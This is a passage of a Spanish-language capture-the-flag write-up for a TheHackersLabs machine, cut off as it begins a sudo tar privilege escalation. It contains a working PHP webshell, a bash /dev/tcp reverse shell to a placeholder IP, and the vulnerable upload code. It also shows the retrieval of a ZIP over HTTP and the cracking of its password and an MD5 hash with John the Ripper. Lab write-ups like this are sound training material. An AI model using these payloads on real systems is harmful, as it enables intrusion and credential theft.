+</span></span><span style="display:flex;"><span>/upload.php           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3277<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3968<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/server-status        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 280<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">882176</span> / <span style="color:#ae81ff">882176</span> <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-x</em></td>
+					<td>Para indicar una busqueda de archivos específicos.</td>
+			</tr>
+	</tbody>
+</table>
+<p>En ambos casos, descubrimos el directorio <code>/uploads</code>.</p>
+<p>Visitémoslo:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-uploader/Captura6.png">
+</p>
+<p>Encontramos dónde se están guardando nuestros archivos.</p>
+<p>Si visitamos uno de esos directorios, encontraremos nuestro archivo de texto:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-uploader/Captura7.png">
+</p>
+<p>Entonces, es posible que podamos subir una <strong>Webshell</strong> de <strong>PHP</strong> que nos permita ejecutar comandos y así, podríamos mandarnos una <strong>Reverse Shell</strong>.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="Webshell">Abusando de Carga de Archivos para Cargar Webshell de PHP</h3>
+<p>Primero crearemos la <strong>Webshell</strong> de <strong>PHP</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat webshell.php
+</span></span><span style="display:flex;"><span>&lt;?php
+</span></span><span style="display:flex;"><span>	system<span style="color:#f92672">(</span>$_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;cmd&#39;</span><span style="color:#f92672">])</span>;
+</span></span><span style="display:flex;"><span>?&gt;
+</span></span></code></pre></div><p>Ahora la cargamos a la página web:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-uploader/Captura8.png">
+</p>
+<p>Nuestro archivo se subió exitosamente, lo que indica que no hay ningún filtro para los archivos subidos.</p>
+<p>Revisamos el directorio <code>/uploads</code> y ahí encontraremos nuestra <strong>Webshell</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-uploader/Captura9.png">
+</p>
+<p>Entramos a la <strong>Webshell</strong> y usamos el parámetro <strong>cmd</strong> que usamos en el script para ejecutar comandos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-uploader/Captura10.png">
+</p>
+<p>Excelente, funciona.</p>
+<p>Intentemos mandarnos una <strong>Reverse Shell</strong>.</p>
+<p>Abre un listener con <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Usa la siguiente <strong>Reverse Shell</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#39;bash -i &gt;%26 /dev/tcp/Tu_IP/443 0&gt;%261&#39;</span>
+</span></span></code></pre></div><p>Y ejecútala en la <strong>Webshell</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-uploader/Captura11.png">
+</p>
+<p>Observa la <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.100.160<span style="color:#f92672">]</span> <span style="color:#ae81ff">46926</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>873<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>www-data@TheHackersLabs-Operator:/var/www/html/uploads/cloud_024ac6$ whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>www-data
+</span></span></code></pre></div><p>Estamos dentro.</p>
+<p>Obtengamos una sesión interactiva para continuar:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Paso 1:</span>
+</span></span><span style="display:flex;"><span>script /dev/null -c bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 2:</span>
+</span></span><span style="display:flex;"><span>CTRL + Z
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 3:</span>
+</span></span><span style="display:flex;"><span>stty raw -echo; fg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 4:</span>
+</span></span><span style="display:flex;"><span>reset -&gt; xterm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 5:</span>
+</span></span><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm <span style="color:#f92672">&amp;&amp;</span> export SHELL<span style="color:#f92672">=</span>bash <span style="color:#f92672">&amp;&amp;</span> stty rows <span style="color:#ae81ff">51</span> columns <span style="color:#ae81ff">189</span>
+</span></span></code></pre></div><h2 id="Post">Post Explotación</h2>
+<h3 id="linEnum">Enumeración de la Máquina Víctima</h3>
+<p>Movámonos un poco para salir del directorio de la <strong>Webshell</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@TheHackersLabs-Operator:/var/www/html/uploads/cloud_024ac6$ cd ../../
+</span></span><span style="display:flex;"><span>www-data@TheHackersLabs-Operator:/var/www/html$ ls
+</span></span><span style="display:flex;"><span>index.html  upload.php	uploads
+</span></span></code></pre></div><p>Aquí encontramos los archivos de la página web.</p>
+<p>Si revisamos el archivo <strong>upload.php</strong>, veremos el porqué es vulnerable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@TheHackersLabs-Operator:/var/www/html$ cat upload.php 
+</span></span><span style="display:flex;"><span>&lt;?php
+</span></span><span style="display:flex;"><span>$upload_dir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/var/www/html/uploads/&#34;</span>;
+</span></span><span style="display:flex;"><span>$secret_folder <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cloud_&#34;</span> . bin2hex<span style="color:#f92672">(</span>random_bytes<span style="color:#f92672">(</span>3<span style="color:#f92672">))</span>; // Ej: cloud_a1b2c3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>$_SERVER<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;REQUEST_METHOD&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span> <span style="color:#f92672">&amp;&amp;</span> isset<span style="color:#f92672">(</span>$_FILES<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;archivo&#39;</span><span style="color:#f92672">]))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>!is_dir<span style="color:#f92672">(</span>$upload_dir . $secret_folder<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        mkdir<span style="color:#f92672">(</span>$upload_dir . $secret_folder, 0755, true<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    $nombre_archivo <span style="color:#f92672">=</span> basename<span style="color:#f92672">(</span>$_FILES<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;archivo&#39;</span><span style="color:#f92672">][</span><span style="color:#e6db74">&#39;name&#39;</span><span style="color:#f92672">])</span>;
+</span></span><span style="display:flex;"><span>    $archivo_tmp <span style="color:#f92672">=</span> $_FILES<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;archivo&#39;</span><span style="color:#f92672">][</span><span style="color:#e6db74">&#39;tmp_name&#39;</span><span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>move_uploaded_file<span style="color:#f92672">(</span>$archivo_tmp, $upload_dir . $secret_folder . <span style="color:#e6db74">&#34;/&#34;</span> . $nombre_archivo<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        $hash_archivo <span style="color:#f92672">=</span> substr<span style="color:#f92672">(</span>md5<span style="color:#f92672">(</span>$nombre_archivo<span style="color:#f92672">)</span>, 0, 8<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>        $mensaje_exito <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;div class=&#39;alert success&#39;&gt;✅ Archivo procesado. ID: </span>$hash_archivo<span style="color:#e6db74">&lt;/div&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        $mensaje_error <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;div class=&#39;alert error&#39;&gt;❌ Error en la subida&lt;/div&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>?&gt;
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Observa que no hay ningún filtro a la hora de subir archivos, por lo que pudimos subir cualquier tipo y estos se ejecutan. Además, el ID que vimos al subir un archivo, solo es el nombre del archivo codificado en <strong>MD5</strong>.</p>
+<p>Veamos qué usuarios existen en la máquina:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@TheHackersLabs-Operator:/var/www/html$ cat /etc/passwd | grep <span style="color:#e6db74">&#39;bash&#39;</span>
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>operatorx:x:1000:1000:operator:/home/operatorx:/bin/bash
+</span></span></code></pre></div><p>Solo hay un usuario aparte del <strong>Root</strong>.</p>
+<p>Encontraremos el directorio de ese usuario en el directorio <code>/home</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@TheHackersLabs-Operator:/var/www/html$ ls -la /home
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root      root      <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">19</span> 21:49 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">23</span> root      root      <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">7</span> 02:36 ..
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root      root        <span style="color:#ae81ff">66</span> Aug <span style="color:#ae81ff">19</span> 21:49 Readme.txt
+</span></span><span style="display:flex;"><span>drwxr-x---  <span style="color:#ae81ff">5</span> operatorx operatorx <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">8</span> 17:43 operatorx
+</span></span></code></pre></div><p>Sin querer, encontramos un archivo de texto.</p>
+<p>Leámoslo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@TheHackersLabs-Operator:/var/www/html$ cat /home/Readme.txt 
+</span></span><span style="display:flex;"><span>He guardado mi archivo zip más importante en un lugar secreto.
+</span></span></code></pre></div><p>Nos han dado una pista sobre un <strong>archivo ZIP</strong> oculto.</p>
+<p>Podemos usar el comando <strong>find</strong> para buscar solo <strong>archivos ZIP</strong> en toda la máquina:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@TheHackersLabs-Operator:/var/www/html$ find / -type f -name <span style="color:#e6db74">&#34;*.zip&#34;</span>
+</span></span><span style="display:flex;"><span>find: <span style="color:#e6db74">&#39;/etc/credstore.encrypted&#39;</span>: Permission denied
+</span></span><span style="display:flex;"><span>find: <span style="color:#e6db74">&#39;/etc/multipath&#39;</span>: Permission denied
+</span></span><span style="display:flex;"><span>find: <span style="color:#e6db74">&#39;/etc/ssl/private&#39;</span>: Permission denied
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>find: <span style="color:#e6db74">&#39;/boot/lost+found&#39;</span>: Permission denied
+</span></span><span style="display:flex;"><span>/srv/secret/File.zip
+</span></span><span style="display:flex;"><span>find: <span style="color:#e6db74">&#39;/lost+found&#39;</span>: Permission denied
+</span></span><span style="display:flex;"><span>find: <span style="color:#e6db74">&#39;/root&#39;</span>: Permission denied
+</span></span></code></pre></div><p>Encontramos un <strong>archivo ZIP</strong>.</p>
+<p>Mandémoslo a nuestra máquina usando un servidor de <strong>python3</strong>.</p>
+<p>Entra a ese directorio y levanta el servidor:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@TheHackersLabs-Operator:/var/www/html$ cd /srv/secret/
+</span></span><span style="display:flex;"><span>www-data@TheHackersLabs-Operator:/srv/secret$ which python3
+</span></span><span style="display:flex;"><span>/usr/bin/python3
+</span></span><span style="display:flex;"><span>www-data@TheHackersLabs-Operator:/srv/secret$ python3 -m http.server <span style="color:#ae81ff">8080</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8080</span> <span style="color:#f92672">(</span>http://0.0.0.0:8080/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><p>Usa <strong>wget</strong> para descargar el <strong>archivo ZIP</strong> en tu máquina:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://192.168.100.160:8080/File.zip
+</span></span></code></pre></div><p>Intentemos descomprimirlo.</p>
+<h3 id="Cracking">Crackeando Archivo ZIP y Contraseña Codificada en MD5 de Usuario operatorx</h3>
+<p>Al intentar descomprimir este archivo, nos pedirá una contraseña:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>7z x File.zip
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>7-Zip 25.01 <span style="color:#f92672">(</span>x64<span style="color:#f92672">)</span> : Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> 1999-2025 Igor Pavlov : 2025-08-03
+</span></span><span style="display:flex;"><span> 64-bit locale<span style="color:#f92672">=</span>es_MX.UTF-8 Threads:6 OPEN_MAX:1024, ASM
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Scanning the drive <span style="color:#66d9ef">for</span> archives:
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> file, <span style="color:#ae81ff">430</span> bytes <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> KiB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Extracting archive: File.zip
+</span></span><span style="display:flex;"><span>--
+</span></span><span style="display:flex;"><span>Path <span style="color:#f92672">=</span> File.zip
+</span></span><span style="display:flex;"><span>Type <span style="color:#f92672">=</span> zip
+</span></span><span style="display:flex;"><span>Physical Size <span style="color:#f92672">=</span> <span style="color:#ae81ff">430</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>Enter password <span style="color:#f92672">(</span>will not be echoed<span style="color:#f92672">)</span>:
+</span></span></code></pre></div><p>Entonces, tenemos que crackear este archivo para obtener la contraseña y así poder descomprimirlo.</p>
+<p>Obtengamos el hash del <strong>archivo ZIP</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>zip2john File.zip &gt; hash
+</span></span><span style="display:flex;"><span>ver 2.0 File.zip/Credentials/ is not encrypted, or stored with non-handled compression type
+</span></span></code></pre></div><p>Es un poco extraño, nos dice que el contenido no está encriptado.</p>
+<p>Podemos analizar el <strong>archivo ZIP</strong> con la herramienta <strong>zipinfo</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>zipinfo -v File.zip
+</span></span><span style="display:flex;"><span>Archive:  File.zip
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Central directory entry <span style="color:#75715e">#2:</span>
+</span></span><span style="display:flex;"><span>---------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  There are an extra -44 bytes preceding this file.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Credentials/Credentials.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  offset of local header from start of archive:   <span style="color:#ae81ff">42</span>
+</span></span><span style="display:flex;"><span>                                                  <span style="color:#f92672">(</span>000000000000002Ah<span style="color:#f92672">)</span> bytes
+</span></span><span style="display:flex;"><span>  file system or operating system of origin:      Unix
+</span></span><span style="display:flex;"><span>  version of encoding software:                   6.3
+</span></span><span style="display:flex;"><span>  minimum file system compatibility required:     MS-DOS, OS/2 or NT FAT
+</span></span><span style="display:flex;"><span>  minimum software version required to extract:   5.1
+</span></span><span style="display:flex;"><span>  compression method:                             unknown <span style="color:#f92672">(</span>99<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  file security status:                           encrypted
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Analizando el resultado, solo el archivo de texto dentro del <strong>archivo ZIP</strong> es el encriptado.</p>
+<p>De igual forma, podemos crackear este archivo con el hash que obtuvimos y usando <strong>JohnTheRipper</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john -w:/usr/share/wordlists/rockyou.txt hash
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>ZIP, WinZip <span style="color:#f92672">[</span>PBKDF2-SHA1 128/128 SSE2 4x<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>HMAC size<span style="color:#f92672">)</span> is <span style="color:#ae81ff">64</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">6</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">121288</span>           <span style="color:#f92672">(</span>File.zip/Credentials/Credentials.txt<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:00:00 DONE <span style="color:#f92672">(</span>2025-10-07 23:01<span style="color:#f92672">)</span> 4.166g/s 25600p/s 25600c/s 25600C/s 123456..iheartyou
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>Tenemos la contraseña.</p>
+<p>Lo descomprimimos y leemos el archivo de texto:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>7z x File.zip
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Enter password <span style="color:#f92672">(</span>will not be echoed<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>Everything is Ok
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Folders: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Files: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Size:       <span style="color:#ae81ff">67</span>
+</span></span><span style="display:flex;"><span>Compressed: <span style="color:#ae81ff">430</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat Credentials/Credentials.txt
+</span></span><span style="display:flex;"><span>User: operatorx
+</span></span><span style="display:flex;"><span>       
+</span></span><span style="display:flex;"><span>Password: d0970714757783e6cf17b26fb8e2298f
+</span></span></code></pre></div><p>Tenemos la contraseña del <strong>usuario operatorx</strong>.</p>
+<p>Pero al usarla, nos dirá que es incorrecta:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@TheHackersLabs-Operator:/srv/secret$ cd /home
+</span></span><span style="display:flex;"><span>www-data@TheHackersLabs-Operator:/home$ su operatorx
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span>su: Authentication failure
+</span></span></code></pre></div><p>Analizando la contraseña, vemos que tiene la sintaxis de un <strong>hash MD5</strong>, por lo que podemos crackearlo con <strong>JohnTheRipper</strong> o con la página web <strong>Crackstation</strong>.</p>
+<p>Hagámoslo de ambas formas.</p>
+<p>Primero con <strong>JohnTheRipper</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john -w:/usr/share/wordlists/rockyou.txt hashMD5 --format<span style="color:#f92672">=</span>Raw-MD5
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>Raw-MD5 <span style="color:#f92672">[</span>MD5 128/128 SSE2 4x3<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Warning: no OpenMP support <span style="color:#66d9ef">for</span> this hash type, consider --fork<span style="color:#f92672">=</span><span style="color:#ae81ff">6</span>
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">112233</span>           <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:00:00 DONE <span style="color:#f92672">(</span>2025-10-07 23:07<span style="color:#f92672">)</span> 25.00g/s 4800p/s 4800c/s 4800C/s 123456..november
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show --format=Raw-MD5&#34;</span> options to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>Tenemos la verdadera contraseña.</p>
+<p>Ahora solo le damos el hash a <strong>Crackstation</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-uploader/Captura12.png">
+</p>
+<p>Y listo, tenemos la contraseña otra vez.</p>
+<p>Usémosla:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@TheHackersLabs-Operator:/home$ su operatorx
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span>operatorx@TheHackersLabs-Operator:/home$ whoami
+</span></span><span style="display:flex;"><span>operatorx
+</span></span></code></pre></div><p>Ya somos el <strong>usuario operatorx</strong>.</p>
+<p>En su directorio encontraremos la flag del usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>operatorx@TheHackersLabs-Operator:/home$ cd operatorx/
+</span></span><span style="display:flex;"><span>operatorx@TheHackersLabs-Operator:~$ ls
+</span></span><span style="display:flex;"><span>user.txt
+</span></span><span style="display:flex;"><span>operatorx@TheHackersLabs-Operator:~$ cat user.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><h3 id="tar">Abusando de Permisos Sudoers Sobre Binario tar para Escalar Privilegios</h3>
+<p>Veamos qué privilegios tiene nuestro usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>operatorx@TheHackersLabs-Operator:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> operatorx on TheHackersLabs-Operator:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin, use_pty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User operatorx may run the following commands on TheHackersLabs-Operator:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/tar
+</span></span></code></pre></div><p>Podemos usar el binario <strong>tar</strong> como <strong>Root</strong>.</p>
+<p>Encontraremos una forma de escalar privilegios en la <strong>guía de GTFOBins</strong>:</p>
+<ul>
